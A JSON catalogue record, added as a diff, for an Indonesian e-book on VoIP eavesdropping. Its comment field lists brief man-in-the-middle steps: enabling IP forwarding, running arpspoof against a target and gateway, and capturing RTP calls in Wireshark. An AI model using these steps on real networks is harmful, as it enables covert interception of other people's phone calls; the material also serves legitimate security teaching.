@@ -1,0 +1,86 @@
+{
+  "id": 10290,
+  "title": "Penyadapan VoIP",
+  "slug": "penyadapan-voip-onno-widodo-purbo",
+  "slugBase": "penyadapan-voip-onno-widodo-purbo",
+  "authors": [
+    {
+      "id": 6928,
+      "name": "Onno Widodo Purbo"
+    }
+  ],
+  "author_sort": "Purbo, Onno Widodo",
+  "tags": [],
+  "publisher": {
+    "id": 731,
+    "name": "Taratsa"
+  },
+  "publishers": [
+    {
+      "id": 731,
+      "name": "Taratsa"
+    }
+  ],
+  "languages": [
+    "ind"
+  ],
+  "pubdate": "2014-11-14",
+  "timestamp": "2026-11-23 19:23:55.168866",
+  "last_modified": "2026-11-23 19:23:55.168870",
+  "series": null,
+  "identifiers": [
+    {
+      "type": "bookid",
+      "value": "urn:uuid:5b7216e5-83fc-5c2c-a46a-c327bb26330a"
+    }
+  ],
+  "formats": [
+    "epub"
+  ],
+  "cover_url": "/cover_thumb/10290?v=1795436635",
+  "cover_og_url": "/cover/10290/og?v=1795436635",
+  "url": "/book/penyadapan-voip-onno-widodo-purbo/",
+  "rating": null,
+  "comment": "Gunakan Kali Linux ARP Poisoning echo 1 &gt; /proc/sys/net/ipv4/ip_forward arpspoof -t ip-kita ip-gateway Menyadap Jalankan Wireshark Filter: RTP Masuk ke aplikasi VoIP calls di Wireshark Referensi https://pentestlab.wordpress.com/2014/07/22/eavesdropping-voip-calls-with-wireshark/",
+  "data": [
+    {
+      "format": "epub",
+      "size": 2239,
+      "name": "Penyadapan VoIP - Onno Widodo Purbo"
+    }
+  ],
+  "text": {
+    "words": 46,
+    "longer_than": 6,
+    "top": [],
+    "distinct": [],
+    "phrases": [],
+    "similar": [
+      [
+        10314,
+        0.63
+      ],
+      [
+        19836,
+        0.63
+      ],
+      [
+        18049,
+        0.63
+      ],
+      [
+        9673,
+        0.59
+      ],
+      [
+        19196,
+        0.57
+      ],
+      [
+        19040,
+        0.57
+      ]
+    ],
+    "sentiment": null
+  }
+}
